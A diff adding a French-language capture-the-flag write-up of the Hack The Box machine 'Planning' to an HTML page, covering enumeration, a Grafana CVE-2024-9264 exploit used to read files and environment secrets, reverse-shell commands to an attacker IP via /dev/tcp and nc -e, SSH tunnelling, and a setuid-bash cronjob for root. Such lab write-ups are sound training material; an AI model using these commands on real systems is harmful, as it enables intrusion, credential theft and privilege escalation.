@@ -238,6 +238,376 @@ root@cap:/root#
 Une excellente machine pour apprendre les bases de l'énumération et de l'exploitation simple.
                     </script>
                 </div>
+
+                <h2 class="clickable"> Planning HTB</h2>
+                <div class="writeup-content">
+                    <script type="text/markdown">
+                    # HTB Planning
+
+Write-up
+
+L’intitulé du CTF fourni des identifiants pour commencer.
+
+id: admin
+
+pwd: 0D5oT70Fq13EvB5r
+
+# Reconnaissance
+
+```bash
+nmap -p- -sC -sV -O 10.10.11.68
+
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
+|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://planning.htb/
+```
+
+## Scan des vulnérabilités
+
+```bash
+nuclei -target http://planning.htb
+
+[missing-sri] [http] [info] http://planning.htb ["https://code.jquery.com/jquery-3.4.1.min.js","https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"]
+[external-service-interaction] [http] [info] http://planning.htb
+[waf-detect:nginxgeneric] [http] [info] http://planning.htb
+[ssh-sha1-hmac-algo] [javascript] [info] planning.htb:22
+[ssh-server-enumeration] [javascript] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
+[ssh-password-auth] [javascript] [info] planning.htb:22
+[ssh-auth-methods] [javascript] [info] planning.htb:22 ["["publickey","password"]"]
+[openssh-detect] [tcp] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
+[form-detection] [http] [info] http://planning.htb
+[nginx-version] [http] [info] http://planning.htb ["nginx/1.24.0"]
+[http-missing-security-headers:strict-transport-security] [http] [info] http://planning.htb
+[http-missing-security-headers:permissions-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:x-frame-options] [http] [info] http://planning.htb
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:content-security-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:x-content-type-options] [http] [info] http://planning.htb
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://planning.htb
+[http-missing-security-headers:referrer-policy] [http] [info] http://planning.htb
+[http-missing-security-headers:clear-site-data] [http] [info] http://planning.htb
+[tech-detect:nginx] [http] [info] http://planning.htb
+[tech-detect:owl-carousel] [http] [info] http://planning.htb
+[caa-fingerprint] [dns] [info] planning.htb
+[INF] Scan completed in 1m. 24 matches found.
+```
+
+## Fuzzing
+
+```bash
+$ ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u  http://10.10.11.68 -fc 301
+
+grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 93ms]
+```
+
+```bash
+curl --path-as-is -i "http://grafana.planning.htb/public/build/datasource/../../../../../../../../etc/passwd"
+```
+
+```bash
+$ curl -i "http://grafana.planning.htb/"
+
+HTTP/1.1 302 Found
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 21 Sep 2025 22:11:14 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 29
+Connection: keep-alive
+Cache-Control: no-store
+Location: /login
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Xss-Protection: 1; mode=block
+
+<a href="/login">Found</a>.
+```
+
+Cette commande permet de trouver la version de Grafana.
+
+```bash
+$ curl -s "http://grafana.planning.htb/login" | grep -i version
+                           
+"version":"11.0.0" et "Grafana v11.0.0 (83b9528bce)"
+```
+
+```bash
+$ gobuster dir -u http://grafana.planning.htb -w directory-list-2.3-medium.txt -x php,js,txt --exclude-length 29
+
+/login                (Status: 200) [Size: 38241]
+/signup               (Status: 200) [Size: 38241]
+/public               (Status: 302) [Size: 31] [--> /public/]
+/admin                (Status: 302) [Size: 24] [--> /]
+/plugins              (Status: 302) [Size: 24] [--> /]
+/api.php              (Status: 401) [Size: 102]
+/api.js               (Status: 401) [Size: 102]
+/api                  (Status: 401) [Size: 102]
+/api.txt              (Status: 401) [Size: 102]
+/robots.txt           (Status: 200) [Size: 26]
+```
+
+# Exploitation
+
+J'ai trouvé une faille pour Grafana version 11.
+
+Ce repository fourni un exploit Python pour la https://github.com/nollium/CVE-2024-9264.git
+
+Donc je l’ai lancé avec les creds initiaux, pour accéder à la base de données.
+
+```bash
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb:80
+ 
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /etc/passwd
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/etc/passwd'):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+```
+
+```bash
+┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: cat /home/grafana/user.txt
+[-] Unexpected response format:
+[-] {
+    "results": {
+        "B": {
+            "error": "exit status 1IO Error: Pipe process exited with non-zero exit 
+code=\"1\": cat /home/grafana/user.txt >/tmp/grafana_cmd_output 2>&1 |\n",
+            "errorSource": "",
+            "status": 500,
+            "frames": []
+        }
+    }
+}
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
+cat: /home/grafana/user.txt: No such file or directory
+                                                                                             
+┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1" http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1
+[-] Unexpected response format:
+[-] {
+    "results": {
+        "B": {
+            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process
+exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1 
+>/tmp/grafana_cmd_output 2>&1 |\n",
+            "errorSource": "",
+            "status": 500,
+            "frames": []
+        }
+    }
+}
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
+cat: /home/grafana/user.txt: No such file or directory
+```
+
+```bash
+ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/flag.txt http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /home/grafana/flag.txt
+[-] File not found
+                                                                                             
+┌──(.venv)─(kali㉿kali)-[~/Documents/htb/Planning/CVE-2024-9264]
+└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/pass.txt http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /home/grafana/pass.txt
+[-] File not found
+```
+
+```bash
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "nc -e /bin/sh 10.10.15.17 4444" http://grafana.planning.htb
+```
+
+```bash
+$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /proc/1/environ
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/proc/1/environ'):
+```
+
+```bash
+$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: env
+[+] Successfully ran duckdb query:
+[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('env >/tmp/grafana_cmd_output 2>&1 |'):
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
+GF_PATHS_HOME=/usr/share/grafana
+HOSTNAME=7ce659d667d7
+SHLVL=0
+AWS_AUTH_EXTERNAL_ID=
+HOME=/usr/share/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_LOGS=/var/log/grafana
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+AWS_AUTH_SESSION_DURATION=15m
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+PWD=/usr/share/grafana
+
+```
+
+Création d’un environnement dans le container Docker, qui me permet d’obtenir le mot de passe du user **enzo** *RioTecRANDEntANT*
+
+## Connexion SSH
+
+Avec le password trouvé précédemment.
+
+```bash
+$ ssh enzo@10.10.11.68     
+The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
+ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
+enzo@10.10.11.68's password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+
+Last login: Sun Sep 21 23:57:11 2025 from 10.10.15.17
+enzo@planning:~$ 
+```
+
+```bash
+enzo@planning:~$ netstat -tulnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*              	 			LISTEN      -                   
+tcp        0      0 127.0.0.1:38283         0.0.0.0:*               			LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               			LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               				LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               				LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               			LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               				LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               			LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    						LISTEN      -                   
+udp        0      0 127.0.0.54:53           0.0.0.0:*                           			-                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          			-         
+```
+
+Le port 8000 semble être intéressant.
+
+```bash
+enzo@planning:/$ ls
+bin@                boot/   dev/  home/  lib64@              lost+found/  mnt/  proc/  run/   sbin.usr-is-merged/  sys/  usr/
+bin.usr-is-merged/  cdrom/  etc/  lib@   lib.usr-is-merged/  media/       opt/  root/  sbin@  srv/                 tmp/  var/
+enzo@planning:/$ cd opt
+enzo@planning:/opt$ ls
+containerd  crontabs
+enzo@planning:/opt$ cd containerd
+enzo@planning:/opt/containerd$ ls
+ls: cannot open directory '.': Permission denied
+enzo@planning:/opt/containerd$ cd ..
+enzo@planning:/opt$ ls
+containerd  crontabs
+enzo@planning:/opt$ cd crontabs
+enzo@planning:/opt/crontabs$ ls
+crontab.db  env.db
+enzo@planning:/opt/crontabs$ cat env.db
+enzo@planning:/opt/crontabs$ cat crontab.db
+{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
+{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
+```
+
+Le fichier crontab.db contenait le password ***P4ssw0rdS0pRi0T3c .***
+
+J’ai créé un tunnel SSH pour le crontab avec les identifiants du user Enzo.
+
+```bash
+ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
+```
+
+Je n’avais plus qu’à accéder au crontab UI dans le navigateur à l’adresse 127.0.0.1:8000 et me connecter avec les identifants.
+
+```bash
+root
+P4ssw0rdS0pRi0T3c
+```
+
+Toujours dans l’UI crontab, j’ai ajouter un cronjob. 
+
+```bash
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+```
+
+```bash
+/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip 
+/var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz
+```
+
+```bash
+/root/scripts/cleanup.sh
+```
+
+Déconnexion puis reconnexion afin que les changements soient pris en compte.
+
+```bash
+enzo@planning:~$ /tmp/rootbash -p
+rootbash-5.2# ls
+user.txt
+rootbash-5.2# cat user.txt
+c2eccb774042d4ac3ff83c3c66b55250
+rootbash-5.2# cd root
+rootbash: cd: root: No such file or directory
+rootbash-5.2# cd /root
+rootbash-5.2# ls
+root.txt  scripts
+rootbash-5.2# cat root.txt
+b7f38a74e151fbff1dc3a481ca59db70
+
+rootbash-5.2# cd scripts
+rootbash-5.2# ls
+cleanup.sh  crontab.db  docker-compose.yml  Dockerfile
+rootbash-5.2# cleanup.sh
+```
+
+# Conclusion
+
+Cette box était plutôt cool. J’ai pû toucher un peu aux bases de données, à Grafana.
+
+J’ai appris à faire un tunnel SSH pour un accès via un browser. C’était pas évident cette partie.
+                    
+                    </script>
+                </div>
+
+                
             </div>
             <div class="writeup-item">
                 <h2 class="clickable">Machine Basique</h2>
@@ -405,6 +775,7 @@ Un challenge intéressant qui mêle plusieurs disciplines.
     </script>
 </body>
 </html>
+
 
 
 
